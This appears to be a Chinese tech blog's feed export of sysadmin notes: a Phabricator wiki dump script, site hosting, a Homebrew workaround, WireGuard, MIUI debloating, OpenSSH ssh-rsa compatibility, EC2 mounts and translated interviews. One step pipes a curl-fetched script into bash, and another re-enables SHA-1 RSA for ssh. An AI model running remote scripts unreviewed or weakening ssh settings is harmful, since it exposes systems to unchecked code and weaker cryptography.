    <content><![CDATA[<h1 id="How-to-dump-all-wiki-pages-from-Phabricator"><a href="#How-to-dump-all-wiki-pages-from-Phabricator" class="headerlink" title="How to dump all wiki pages from Phabricator"></a>How to dump all wiki pages from Phabricator</h1><p>参照的源代码在这里：<a href="https://gist.github.com/HackToHell/9f261728f4ceda1605c9b3b1f46addbc">https://gist.github.com/HackToHell/9f261728f4ceda1605c9b3b1f46addbc</a></p>
<h2 id="install-software"><a href="#install-software" class="headerlink" title="install software"></a>install software</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install \</span><br><span class="line">	python-sqlalchemy \</span><br><span class="line">	python-pandas \</span><br><span class="line">	MySQL-python;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change me to the phriction database</span></span><br><span class="line">engine = create_engine( </span><br><span class="line">        <span class="string">&#x27;mysql://user:password@1.1.1.1/phabricator_phriction?charset=utf8mb4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df=pd.read_sql(<span class="string">&#x27;select * from phriction_content&#x27;</span>,engine)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">x</span>):</span><br><span class="line">    x=x.iloc[<span class="number">0</span>]</span><br><span class="line">    strpath=<span class="string">&#x27;data/&#x27;</span> + x[<span class="string">&#x27;slug&#x27;</span>][:-<span class="number">1</span>] + <span class="string">&#x27;.md&#x27;</span></span><br><span class="line">    <span class="comment">#print strpath</span></span><br><span class="line">    strdir = os.path.dirname(strpath)</span><br><span class="line">    <span class="comment">#print strdir</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(strdir)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(strdir):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(strpath, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(x[<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name,group <span class="keyword">in</span> df.groupby(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(group) &gt; <span class="number">1</span>:</span><br><span class="line">        x=group[group[<span class="string">&#x27;version&#x27;</span>] == group[<span class="string">&#x27;version&#x27;</span>].<span class="built_in">max</span>()] <span class="comment">#Get only the latest version</span></span><br><span class="line">        get(x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        get(group)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong><em>NOTE:</em></strong>  这里有个小 bug：如果当某个页面 A 被 move 成 B 之后呢，这个程序只能 dump 出 A.md，而且里面是空的。</p>
</blockquote>
]]></content>
      <tags>
        <tag>Phabricator</tag>
        <tag>wiki</tag>
        <tag>python</tag>
        <tag>exxport</tag>
      </tags>
  </entry>
  <entry>
    <title>How to host a project named &quot;Uses This&quot;</title>
    <url>/2019/06/How%20to%20host%20project%20usesthis/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最近发现一个好玩儿的东东，一个澳大利亚的人写了个网站，专门做一些 IT 人事（也有其他行业的）的访问，问你都用什么（硬件软件）呀什么的。地址在：<a href="https://usesthis.com/">这里</a></p>
<p>后来发现居然还是开源的！！！</p>
<p>一下子忍不住手痒就给弄过来自己 host 了一个网站：<a href="https://usesthis.theyan.gs/">我的 Uses This</a></p>
<span id="more"></span>

<p>下面讲讲怎样 host 这个网站的。说实话，ruby 的东西还没怎么弄过。</p>
<h2 id="fetch-data"><a href="#fetch-data" class="headerlink" title="fetch data"></a>fetch data</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/waferbaby/usesthis.git</span><br></pre></td></tr></table></figure>

<h2 id="prepare-env"><a href="#prepare-env" class="headerlink" title="prepare env"></a>prepare env</h2><h3 id="dependent-software-install"><a href="#dependent-software-install" class="headerlink" title="dependent software install"></a>dependent software install</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CentOS</span></span><br><span class="line">yum install rubygem-tilt pandoc</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">apt-get install ruby-tilt pandoc</span><br></pre></td></tr></table></figure>

<h3 id="install-rvm"><a href="#install-rvm" class="headerlink" title="install rvm"></a>install rvm</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 系列用</span></span><br><span class="line">gpg --keyserver \</span><br><span class="line">		hkp://pool.sks-keyservers.net \</span><br><span class="line">	--recv-keys \</span><br><span class="line">		409B6B1796C275462A1703113804BB82D39DC0E3 \</span><br><span class="line">		7D2BAF1CF37B13E2069D6956105BD0E739499BDB</span><br><span class="line"><span class="comment"># CentOS 系列用</span></span><br><span class="line">gpg2 --keyserver \</span><br><span class="line">		hkp://pool.sks-keyservers.net \</span><br><span class="line">	--recv-keys \</span><br><span class="line">		409B6B1796C275462A1703113804BB82D39DC0E3 \</span><br><span class="line">		7D2BAF1CF37B13E2069D6956105BD0E739499BDB</span><br><span class="line"></span><br><span class="line">curl -sSL https://get.rvm.io | bash -s stable</span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/rvm.sh</span><br></pre></td></tr></table></figure>

<h3 id="install-ruby"><a href="#install-ruby" class="headerlink" title="install ruby"></a>install ruby</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> usesthis</span><br><span class="line">rvm install <span class="string">&quot;ruby-2.6.3&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="install-dimples-others"><a href="#install-dimples-others" class="headerlink" title="install dimples &amp; others"></a>install dimples &amp; others</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install dimples pandoc-ruby</span><br></pre></td></tr></table></figure>

<h2 id="config-setup-as-you-want"><a href="#config-setup-as-you-want" class="headerlink" title="config setup as you want"></a>config setup as you want</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim config.json</span><br></pre></td></tr></table></figure>

<h2 id="build"><a href="#build" class="headerlink" title="build"></a>build</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dimples build</span><br></pre></td></tr></table></figure>

<h2 id="some-problem"><a href="#some-problem" class="headerlink" title="some problem"></a>some problem</h2><p>templates&#x2F;feeds&#x2F;atom.erb 也许有些 bug</p>
<p>需要将其 21 行、22 行的内容：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;%== <span class="string">&quot;&lt;p&gt;&lt;img src=\&quot;http://usesthis.theyan.gs/images/interviews/<span class="subst">#&#123;interview.slug&#125;</span>/portrait.jpg\&quot; width=\&quot;500\&quot; height=\&quot;325\&quot; alt=\&quot;<span class="subst">#&#123;interview.title&#125;</span>\&quot;&gt;&lt;/p&gt;&quot;</span> %&gt;</span><br><span class="line">&lt;%== interview.rendered_contents %&gt;</span><br></pre></td></tr></table></figure>

<p>改成：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;%= <span class="string">&quot;&lt;p&gt;&lt;img src=\&quot;http://usesthis.theyan.gs/images/interviews/<span class="subst">#&#123;interview.slug&#125;</span>/portrait.jpg\&quot; width=\&quot;500\&quot; height=\&quot;325\&quot; alt=\&quot;<span class="subst">#&#123;interview.title&#125;</span>\&quot;&gt;&lt;/p&gt;&quot;</span> %&gt;</span><br><span class="line">&lt;%= interview.rendered_contents %&gt;</span><br></pre></td></tr></table></figure>

<p>build 才能成功</p>
]]></content>
      <tags>
        <tag>ruby</tag>
        <tag>gem</tag>
        <tag>rvm</tag>
        <tag>dimples</tag>
      </tags>
  </entry>
  <entry>
    <title>How to install/upgrade fomula from local dmg file</title>
    <url>/2020/10/How-to-install-or-upgrade-fomula-from-local-dmg-file/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>brew 升级 Joplin 的时候，由于大陆从 github 下载软件包太慢，所以几乎每次都无法完整下载软件包而 timeout 退出。</p>
<p>于是就找了个 github 的代理手工下载（二进制）软件包，然后想通过 brew 直接用本地的 .dmg 文件来升级。</p>
<p>这里的难点，也是本文要谈的问题，就是如何让 brew 直接使用本地下载好的 .dmg 文件升级 Joplin（其他软件也一样）而不是从网上（github）下载。</p>
<span id="more"></span>

<h2 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h2><p>执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew upgrade Joplin</span><br></pre></td></tr></table></figure>

<p>当开始下载 Joplin 的时候，Ctrl+C 终止掉。然后进入目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> $(brew --cache)/downloads/</span><br><span class="line"><span class="comment"># 找出最新的一个下载的文件，可以考虑用如下命令：</span></span><br><span class="line"><span class="built_in">ls</span> -lt | grep -v total | <span class="built_in">head</span> -n 1</span><br></pre></td></tr></table></figure>

<p>这里会看到一个文件名，就我这里的具体情况来说是：</p>
<blockquote>
<p>83b470164a0a78f6edefacb829dccc523bc774224c0aa9b2814fa16f719fb65e–Joplin-1.7.11.dmg.incomplete</p>
</blockquote>
<p>然后把手工下载好的 Joplin 的 dmg 文件（我这里是 ～&#x2F;Downloads&#x2F;Joplin-1.7.11.dmg）拷贝过来，并重命名成需要的文件名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> ~/Downloads/Joplin-1.7.11.dmg \</span><br><span class="line">83b470164a0a78f6edefacb829dccc523bc774224c0aa9b2814fa16f719fb65e--Joplin-1.7.11.dmg</span><br><span class="line"><span class="comment"># 注意：上面的目标文件名是上一步看到的文件名去掉 .incomplete</span></span><br></pre></td></tr></table></figure>

<p>最后，就可以直接安装更新了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew upgrade Joplin</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>tips</tag>
        <tag>upgrade</tag>
        <tag>macOS</tag>
        <tag>brew</tag>
        <tag>Homebrew</tag>
        <tag>dmg</tag>
        <tag>Joplin</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 下 wireguard 出问题的解决</title>
    <url>/2019/03/Linux%20%E4%B8%8B%20wireguard%20%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>办公室某台跑 wireguard 打洞的机器挂了，重启之后发现 wireguard 设备起不来，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wg-quick up wg_ofc;</span><br><span class="line"><span class="comment"># 配置文件为：/etc/wireguard/wg_ofc.conf</span></span><br></pre></td></tr></table></figure>

<p>会报错：</p>
<blockquote>
<p>Cannot find device “wg_ofc”</p>
</blockquote>
<span id="more"></span>

<h1 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h1><p>参照另外的文章：<a href="/2019/11/%E7%94%A8%20wireguard%20%E5%9C%A8%E4%B8%A4%E4%B8%AA%E7%BD%91%E7%BB%9C%E4%B9%8B%E9%97%B4%E6%89%93%E6%B4%9E/index.html" title="用 wireguard 在两个网络之间打洞">用 wireguard 在两个网络之间打洞</a> 能了解以前的“洞”是怎么打的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsmod | grep wireguard;</span><br></pre></td></tr></table></figure>

<p>看果然没有 load wireguard 模块，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modprobe wireguard;</span><br></pre></td></tr></table></figure>

<p>会提示这个模块（wireguard）找不到，大致了解什么问题了，应该是某一次升级过 linux kernel，而没有安装相应的 source code 和 headers，从而导致 wireguard 模块没有被重新编译进新的内核模块目录，解决起来也算是相对简单。</p>
<h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a;</span><br><span class="line"><span class="comment"># 获取当前 kernel 的版本号，这里是：3.10.0-1062.4.1.el7.x86_64</span></span><br><span class="line">rpm -qi wireguard-dkms | grep Version</span><br><span class="line"><span class="comment"># 获取 wireguard 模块的版本号，这里是：0.0.20190913</span></span><br><span class="line">yum install \ </span><br><span class="line">    kernel-headers-3.10.0-1062.4.1.el7.x86_64 \</span><br><span class="line">    kernel-devel-3.10.0-1062.4.1.el7.x86_64;</span><br><span class="line"><span class="comment"># 安装需要的 source code 以及 headers</span></span><br><span class="line">dkms build \</span><br><span class="line">    -m wireguard \</span><br><span class="line">    -v 0.0.20190913 \</span><br><span class="line">    -k 3.10.0-1062.4.1.el7.x86_64;</span><br><span class="line"><span class="comment"># 重新为新 kernel 编译 wireguard 模块</span></span><br><span class="line">dkms install \</span><br><span class="line">    wireguard/0.0.20190913 \</span><br><span class="line">    -k 3.10.0-1062.4.1.el7.x86_64;</span><br><span class="line"><span class="comment"># 为新的 kernel 安装重新编好的 wireguard 模块</span></span><br><span class="line">wg-quick up wg_ofc;</span><br><span class="line"><span class="comment"># 启动原来配置好的 wg_ofc 设备</span></span><br></pre></td></tr></table></figure>

<p>一切又 OK 了！</p>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>7.x</tag>
        <tag>Linux</tag>
        <tag>wireguard</tag>
        <tag>wg-quick</tag>
        <tag>dkms</tag>
      </tags>
  </entry>
  <entry>
    <title>MIUI13 精简优化系统自带的 app</title>
    <url>/2022/01/MIUI13%20%E7%B2%BE%E7%AE%80%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E7%9A%84%20app/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最近换了个红米 K40 的手机，刷机需要等 7 天，在等待过程中，系统自带的 MIUI 12.5 OTA 升级成了 MIUI 13，同样，在 MIUI 13 下也做了很多系统自带 app 的优化（删除）工作，特此记录，等过了 7 天刷成 miaomi.eu 后或再 OTA 升级后直接重用。</p>
<span id="more"></span>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>手机打开 develop 菜单</li>
<li>打开 usb 调试功能</li>
<li>电脑上安装 adb 软件</li>
<li>……</li>
</ul>
<p>这些都是基本操作，就不赘述了。</p>
<h2 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show me the code"></a>show me the code</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell pm uninstall --user 0 com.miui.systemAdSolution</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.analytics</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.gamecenter.sdk.service</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.gamecenter</span><br><span class="line">adb shell pm uninstall --user 0 com.sohu.inputmethod.sogou.xiaomi</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.player</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.video</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.notes</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.translation.youdao</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.translation.kingsoft</span><br><span class="line">adb shell pm uninstall --user 0 com.android.email</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.scanner</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.hybrid</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.bugreport</span><br><span class="line">adb shell pm uninstall --user 0 com.milink.service</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.gallery</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.yellowpage</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.midrop</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.virtualsim</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.payment</span><br><span class="line">adb shell pm uninstall --user 0 com.mipay.wallet</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.voiceassist</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.touchassistant</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.mitunes</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.pass</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.klo.bugreport</span><br><span class="line">adb shell pm uninstall --user 0 org.mipay.android.manager</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.voicetrigger</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.personalassistant</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.aiasst.vision</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.aiasst.service</span><br><span class="line"><span class="comment"># com.miui.analytics 如果被删除，重启又会被自动安装上，发现禁用好像效果还不错</span></span><br><span class="line">adb shell pm disable-user --user 0  com.miui.analytics</span><br><span class="line">adb shell pm uninstall --user 0 com.xiaomi.migameservice</span><br><span class="line">adb shell pm uninstall --user 0 com.miui.miservice</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>MIUI</tag>
        <tag>MUI13</tag>
        <tag>Redmi</tag>
        <tag>K40</tag>
        <tag>Xiaomi</tag>
        <tag>xiaomi.eu</tag>
        <tag>红米</tag>
        <tag>小米</tag>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSSH 8.8 以后版本跟老版的兼容性问题</title>
    <url>/2022/06/OpenSSH%208.8%20%E4%BB%A5%E5%90%8E%E7%89%88%E6%9C%AC%E8%B7%9F%E8%80%81%E7%89%88%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最近发现 ssh 到自己的路由器，发现连不上，报错：</p>
<blockquote>
<p>Unable to negotiate with 10.0.0.1 port 22: no matching host key type found. Their offer: ssh-rsa</p>
</blockquote>
<p><strong><em>NOTE:</em></strong> 上面的 “10.0.0.1” 是服务器的 IP 地址</p>
<span id="more"></span>

<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>网上查了下，发现是 OpenSSH 新版本的锅。OpenSSH 8.8 开始，缺省不再支持使用 SHA-1 hash 算法的 RSA 签名。</p>
<p>其实这个变动对稍稍新一点的 OpenSSH 服务器（据说 7.2 及以后版本）没有问题，因为其除了 SHA-1 外，还支持 SHA-256、SHA-512 等更强壮的算法。ssh-rsa 的密钥会自动使用更强壮的 hash 算法了。</p>
<p>但是对一些较老的 OpenSSH 服务器（7.2 以前版本），则就有问题了，因为其对 ssh-rsa 只支持 SHA-1 一种 hash 算法。但此时客户端又不支持这种算法，故而连接会失败。系统上面的错误。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>ssh 连接有问题的服务器时，加上两个参数即可。如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh \</span><br><span class="line">  -oHostKeyAlgorithms=+ssh-rsa \</span><br><span class="line">  -oPubKeyAcceptedAlgorithms=+ssh-rsa \</span><br><span class="line">  10.0.0.1</span><br><span class="line"><span class="comment"># 假设 ssh 服务器 IP 地址是 10.0.0.1</span></span><br></pre></td></tr></table></figure>

<h2 id="todo-list"><a href="#todo-list" class="headerlink" title="todo list"></a>todo list</h2><ul>
<li>更新自己的密钥对，使用<code>ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/pk4ym_ed25519 -C &quot;m@theyan.gs&quot;</code></li>
<li>把新的公钥部署到服务器上去，包括 github</li>
</ul>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><ul>
<li><a href="https://www.openssh.com/txt/release-8.8?ref=ikarus-sg">OpenSSh 8.8 的 release notes</a></li>
</ul>
]]></content>
      <tags>
        <tag>OpenSSH</tag>
        <tag>ssh</tag>
        <tag>ssh-rsa</tag>
        <tag>SHA-1</tag>
        <tag>rsa-sha2-512</tag>
        <tag>rsa-sha2-256</tag>
        <tag>HostKeyAlgorithms</tag>
        <tag>PubKeyAcceptedAlgorithms</tag>
      </tags>
  </entry>
  <entry>
    <title>克里斯汀·多德瑞（Christine Dodrill）的访谈</title>
    <url>/2020/01/christine_dodrill/index.html</url>
    <content><![CDATA[<h1 id="克里斯汀·多德瑞（Christine-Dodrill）的访谈"><a href="#克里斯汀·多德瑞（Christine-Dodrill）的访谈" class="headerlink" title="克里斯汀·多德瑞（Christine Dodrill）的访谈"></a>克里斯汀·多德瑞（Christine Dodrill）的访谈</h1><blockquote>
<p><strong><em>NOTE</em></strong>:</p>
</blockquote>
<ul>
<li>原文来自于 <a href="https://usesthis.com/interviews/christine.dodrill/">Christine Dodrill</a></li>
<li>我 HOST 的版本在 <a href="https://usesthis.theyan.gs/interviews/christine.dodrill/">Christine Dodrill</a></li>
</ul>
<h2 id="您是谁，你做什么工作"><a href="#您是谁，你做什么工作" class="headerlink" title="您是谁，你做什么工作"></a>您是谁，你做什么工作</h2><p>我是 <a href="https://christine.website/" title="Christine 的网站">Christine Dodrill</a>，西雅图地区的一位高级 SRE，目前在蒙特利尔。我曾在 <a href="https://www.heroku.com/" title="A service for running and deploying Ruby, Node.js, Clojure, Java, Python, and Scala apps.(提供运行和部署 Ruby，Node.js，Clojure，Java，Python 和 Scala 应用程序服务的提供商。)">Heroku</a>，<a href="https://www.imvu.com/" title="An avatar-based social network.（基于头像的社交网络。）">IMVU</a> 和 <a href="https://www.purestorage.com/" title="一家闪存存储公司">Pure Storage</a> 工作，但目前在 <a href="https://lightspeedhq.com/" title="销售点技术公司">Lightspeed POS</a> 工作。</p>
<span id="more"></span>

<p>在一边，我喜欢用电脑做东西。我有一个 <a href="https://twitter.com/theprincessxena" title="克里斯汀的 Twitter">Twitter</a> 和 <a href="https://mst3k.interlinked.me/@cadey" title="克里斯汀的 Mastodon 帐户">Fediverse</a>。)。最近，我一直在尝试 OS 设计，以便更轻松地终止我们行业的英特尔单一文化。</p>
<h2 id="您使用什么硬件"><a href="#您使用什么硬件" class="headerlink" title="您使用什么硬件"></a>您使用什么硬件</h2><p>我的大部分计算工作都是通过 12.9 英寸 2018 <a href="https://en.wikipedia.org/wiki/IPad_Pro" title="An iOS tablet.">iPad Pro</a> 完成的。我非常喜欢将几乎整个数字生活都集中在一台设备中的便利性。我有 <a href="https://www.apple.com/smart-keyboard/" title="A keyboard and cover for the iPad Pro.">Smart Keyboard</a> 和 <a href="https://www.fiftythree.com/pencil" title="An iPad stylus.">Pencil</a>。我也有一个 12 英寸的 <a href="https://en.wikipedia.org/wiki/MacBook_(2015_version)" title="A very thin 12 inch laptop.（至今为止最轻便的 Mac 笔记本电脑）">MacBook</a>，每当我需要在 <a href="https://en.wikipedia.org/wiki/MacOS" title="An operating system for Mac hardware.">macOS</a> 中执行操作时，都会使用它，但是这种情况在 iOS 中越来越少了生态系统变得越来越强大。</p>
<p>我有一个来自 <a href="https://www.soyoustart.com/" title="主机托管公司">SoYouStart</a> 的专用服务器，具有 8 核，32GB 内存和 2TB 存储。我将其用于大多数编程方面。</p>
<p>我每天都随身携带 <a href="https://en.wikipedia.org/wiki/IPhone_XS" title="A 5.8 inch iOS phone.">iPhone XS</a> 和 <a href="https://en.wikipedia.org/wiki/Apple_Watch_Series_3" title="A smartwatch with optional cellular data.（具有蜂窝网络的智能手表。）">Apple Watch series 3</a>。</p>
<h2 id="您使用什么软件"><a href="#您使用什么软件" class="headerlink" title="您使用什么软件"></a>您使用什么软件</h2><p>我通过 <a href="https://en.wikipedia.org/wiki/Secure_Shell" title="A command-line tool for secure remote connections.">SSH</a> 在 <a href="https://sourceforge.net/projects/tmux/" title="A terminal multiplexer, similar to screen.（类似于 screen 的终端复用器）">tmux</a> 的 <a href="http://www.gnu.org/software/emacs/" title="A free open-source text editor.（免费的开源文本编辑器。）">Emacs</a> 中写代码。在极少数情况下，我将使用 Emacs&#x2F;<a href="https://www.textasticapp.com/" title="A code editor app.">Textastic</a> 进行本地开发，但这仅用于无法远程完成的事情。</p>
<h2 id="您的理想设置是什么"><a href="#您的理想设置是什么" class="headerlink" title="您的理想设置是什么"></a>您的理想设置是什么</h2><p>我很确定我已经拥有了。</p>
]]></content>
      <tags>
        <tag>SRE</tag>
        <tag>UsesThis</tag>
      </tags>
  </entry>
  <entry>
    <title>EC2 上挂载别的机器的根分区时&quot;duplicate uuid&quot; 问题</title>
    <url>/2019/01/ec2-mount-root-duplicate-uuid-error/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>最近要登某一台 ec2，结果其私钥丢了，于是根据文档，将这台 ec2 的机器 stop 掉，然后将根区先 detach 掉，然后再将其 attach 到同 subnet 的另外一台 ec2 上。</p>
<p>按照正常的流程，在另外一台好的 ec2 的机器上将刚 attach 过来的分区 mount 上以后再修改好其 authorized_keys 文件即可完成任务的。</p>
<span id="more"></span>

<h1 id="问题浮现"><a href="#问题浮现" class="headerlink" title="问题浮现"></a>问题浮现</h1><p>但是，当挂载分区时出错了。当时的命令是这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file -s /dev/xvdf1 <span class="comment"># 这里是确认要 mount 的分区是什么格式的，这个例子中是 xfs</span></span><br></pre></td></tr></table></figure>

<p>然后挂载时，出错了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount -t xfs /dev/xvdf1 /mnt/tmp</span><br></pre></td></tr></table></figure>

<p>返回错误：</p>
<blockquote>
<p>mount: wrong fs type, bad option, bad superblock on &#x2F;dev&#x2F;xvdf1,<br>missing codepage or helper program, or other error</p>
</blockquote>
<h1 id="问题根源"><a href="#问题根源" class="headerlink" title="问题根源"></a>问题根源</h1><p>这里的问题是因为跑着的 ec2 和要修改公钥的 ec2 由于是用一个 ami 起来的，故而根分区的 uuid 重复了导致的。</p>
<h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><ul>
<li>xfs_db -c uuid &#x2F;dev&#x2F;xvdf1	# 修改要挂载分区的 uuid</li>
<li>mount -t xfs -o nouuid &#x2F;dev&#x2F;xvdf1 &#x2F;mnt&#x2F;tmp	# 用参数 nouuid 来避免挂载时检查 uuid</li>
</ul>
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>EC2</tag>
        <tag>key pair</tag>
        <tag>mount</tag>
        <tag>uuid</tag>
      </tags>
  </entry>
  <entry>
    <title>Eliza Sorensen 的访谈</title>
    <url>/2018/12/eliza_sorensen/index.html</url>
    <content><![CDATA[<h1 id="Eliza-Sorensen-的访谈"><a href="#Eliza-Sorensen-的访谈" class="headerlink" title="Eliza Sorensen 的访谈"></a>Eliza Sorensen 的访谈</h1><blockquote>
<p><strong><em>NOTE</em></strong>:</p>
</blockquote>
<ul>
<li>原文来自于 <a href="https://www.usesthis.com/interviews/eliza.sorensen/">Eliza Sorensen</a></li>
<li>我 HOST 的版本在 <a href="https://usesthis.theyan.gs/interviews/eliza.sorensen/">Eliza Sorensen</a></li>
</ul>
<h2 id="你是谁，你做什么工作"><a href="#你是谁，你做什么工作" class="headerlink" title="你是谁，你做什么工作"></a>你是谁，你做什么工作</h2><p>我是 Eliza Sorensen 或其他任何地方的 <a href="https://twitter.com/zemmiph0bia" title="Eliza 的 Twitter 帐户">@zemmiph0bia</a>。我是澳大利亚墨尔本市的一名基础设施和安全工程师，也是创建了性工作友好社交空间 <a href="https://switter.at/" title="对性工作者友好的Mastodon服务（可能是NSFW）">Switter.at</a> 和现代广告平台 <a href="https://tryst.link/" title="护送广告平台（可能是NSFW）">Tryst.link</a> 的 <a href="https://assemblyfour.com/" title="性工作者和技术专家的集体">Assembly Four</a> 的共同创始人。</p>
<h2 id="您使用什么硬件"><a href="#您使用什么硬件" class="headerlink" title="您使用什么硬件"></a>您使用什么硬件</h2><p>看来这些天我一直在移动，所以我严重依赖我的 <a href="http://shop.lenovo.com/us/en/laptops/thinkpad/x-series/x1-carbon/" title="14 英寸的轻便笔记本电脑">X1 Carbon</a>, Google <a href="https://en.wikipedia.org/wiki/Pixel_3" title="6.3 英寸 android 智能手机，Google 亲儿子第三代">Pixel 3 XL</a>, Audio Technica <a href="http://sea.audio-technica.com/products/headphones/lifestyle/all-earphones/ath-ar5bt" title="头戴式式无线耳机">ATH-AR5BT headphones</a>，powerpack（很大的背包？），笔记本和 Lamy（凌美，一种笔）<a href="https://www.lamy.com/eng/b2c/safari" title="一种笔">Safari</a>。</p>
